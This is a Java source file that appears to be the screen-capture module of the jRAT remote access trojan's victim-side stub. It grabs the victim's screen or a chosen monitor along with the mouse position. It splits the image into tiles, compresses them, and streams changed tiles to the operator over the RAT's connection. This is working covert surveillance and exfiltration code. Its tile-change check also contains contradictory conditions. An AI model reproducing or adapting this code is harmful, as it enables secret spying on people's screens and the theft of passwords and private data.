package pro.jrat.stub;

import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.util.Iterator;

import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;

import pro.jrat.common.compress.GZip;
import pro.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
import pro.jrat.stub.packets.outgoing.Packet17RemoteScreen;
import pro.jrat.stub.packets.outgoing.Packet18OneRemoteScreen;
import pro.jrat.stub.packets.outgoing.Packet33Thumbnail;

public class RemoteScreen {

	public static int[] prevSums = new int[0];
	public static int prevX;
	public static int prevY;

	public void clearCache() {
		prevSums = new int[0];
		prevX = 0;
		prevY = 0;
	}

	public static int calculateSum(BufferedImage image) {
		int[] pixels = image.getRaster().getPixels(0, 0, image.getWidth(), image.getHeight(), new int[image.getWidth() * image.getHeight() * 3]);
		int sum = 0;
		for (int x = 0; x < image.getWidth(); x += 16) {
			for (int y = 0; y < image.getHeight(); y += 16) {
				sum += pixels[(y * image.getWidth() + x) * 3 + 0];
				sum += pixels[(y * image.getWidth() + x) * 3 + 1];
				sum += pixels[(y * image.getWidth() + x) * 3 + 2];
			}
		}
		return sum;
	}

	public static void send(boolean once, double size, int quality, int monitor, int rows, int columns, DataOutputStream dos) {
		try {
			if (prevSums.length != rows * columns) {
				prevSums = new int[rows * columns];
			}
			BufferedImage image = null;
			Rectangle screenBounds = null;
			
			if (monitor == -1) {
				screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
				image = new Robot().createScreenCapture(screenBounds);
			} else {
				GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
				Robot robotForScreen = new Robot(screen);
				screenBounds = screen.getDefaultConfiguration().getBounds();
				screenBounds.x = 0;
				screenBounds.y = 0;
				image = robotForScreen.createScreenCapture(screenBounds);
			}

			image = resize(image, size / 100D);

			Point point = MouseInfo.getPointerInfo().getLocation();

			AbstractOutgoingPacket packet = new Packet17RemoteScreen(image.getWidth(), image.getHeight(), point.x, point.y);

			int chunks = rows * columns;
			int chunkWidth = image.getWidth() / columns;
			int chunkHeight = image.getHeight() / rows;
			int count = 0;
			int cou = 0;

			BufferedImage imgs[] = new BufferedImage[chunks];

			for (int x = 0; x < rows; x++) {
				for (int y = 0; y < columns; y++) {
					BufferedImage i;
					imgs[count] = i = new BufferedImage(chunkWidth, chunkHeight, image.getType());
					Graphics2D gr = imgs[count++].createGraphics();
					gr.drawImage(image, 0, 0, chunkWidth, chunkHeight, chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight, null);
					gr.dispose();

					ByteArrayOutputStream bss = new ByteArrayOutputStream();
					ImageOutputStream baos = ImageIO.createImageOutputStream(bss);
					Iterator<ImageWriter> iter = ImageIO.getImageWritersByFormatName("jpeg");
					ImageWriter writer = iter.next();
					ImageWriteParam iwp = writer.getDefaultWriteParam();
					iwp.setCompressionMode(2);
					iwp.setCompressionQuality(quality / 10F);
					writer.setOutput(baos);
					writer.write(null, new IIOImage(i, null, null), iwp);
					writer.dispose();
					byte[] buffer = GZip.compress(bss.toByteArray());

					boolean doit = false;

					int sum = calculateSum(i);
					if (sum != prevSums[cou] || prevX >= chunkWidth * y && prevX <= chunkWidth * y + chunkWidth && prevY >= chunkHeight * x && prevY <= chunkHeight * x + chunkHeight && point.x <= chunkWidth * y && point.x >= chunkWidth * y + chunkWidth && point.y <= chunkHeight * x && point.y >= chunkHeight * 5 + chunkHeight) {
						doit = true;
						prevSums[cou] = sum;

					}

					cou++;

					if (doit) {
						Connection.addToSendQueue(packet);
						dos.writeBoolean(false);
						dos.writeInt(x);
						dos.writeInt(y);

						dos.writeInt(buffer.length);
						dos.write(buffer);
						Connection.lock();
					}
				}
			}

			Connection.addToSendQueue(once ? new Packet18OneRemoteScreen(image.getWidth(), image.getHeight(), point.x, point.y) : packet);
			dos.writeBoolean(true);
			Connection.lock();

			for (int i = 0; i < imgs.length; i++) {
				imgs[i] = null;
			}

			image.flush();

			prevX = point.x;
			prevY = point.y;

			System.gc();

		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public static void sendThumbnail() {
		try {
			Connection.addToSendQueue(new Packet33Thumbnail());
		} catch (Exception ex) {
			ex.printStackTrace();
		}

	}

	public static BufferedImage resize(BufferedImage image, int w, int h) {
		BufferedImage img = new BufferedImage(w, h, BufferedImage.TYPE_3BYTE_BGR);
		Graphics2D gr = img.createGraphics();
		gr.drawImage(image.getScaledInstance(w, h, BufferedImage.SCALE_SMOOTH), 0, 0, w, h, null);
		gr.dispose();
		return img;
	}

	public static BufferedImage resize(BufferedImage image, double percent) {
		int scaledWidth = (int) (image.getWidth() * percent);
		int scaledHeight = (int) (image.getHeight() * percent);
		return resize(image, scaledWidth, scaledHeight);
	}

}
